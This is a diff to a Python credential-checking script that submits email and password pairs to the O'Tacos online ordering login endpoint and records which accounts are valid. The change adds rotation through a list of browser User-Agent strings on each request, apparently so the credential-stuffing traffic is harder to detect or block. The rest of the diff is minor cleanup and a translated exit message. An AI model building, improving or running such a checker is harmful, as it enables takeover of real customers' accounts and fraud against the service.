@@ -2,9 +2,18 @@ import requests
 import time
 from colorama import Fore, Style, init
 import os
+import random
 
 init(autoreset=True)
 ORANGE = Fore.YELLOW
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
+    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
+]
 
 def print_title():
     ascii_art = r"""
@@ -19,7 +28,6 @@ def print_title():
     print(ORANGE + ascii_art)
 
 def clear_console():
-    import os
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def load_valids_set():
@@ -35,7 +43,7 @@ def check_account(email, password, valids_set):
         "Content-Type": "application/x-www-form-urlencoded",
         "Origin": "https://commandes.o-tacos.com",
         "Referer": "https://commandes.o-tacos.com/",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+        "User-Agent": random.choice(USER_AGENTS)
     }
     data = {
         "grant_type": "password",
@@ -127,9 +135,10 @@ def menu():
         if choix == "1":
             lancer_checker()
         elif choix == "2":
-            print(f"{ORANGE}Au revoir !")
+            print(f"{ORANGE}Exit ")
             break
         else:
             print(f"{Fore.RED}[!] Choix invalide.")
+
 clear_console()
 menu()
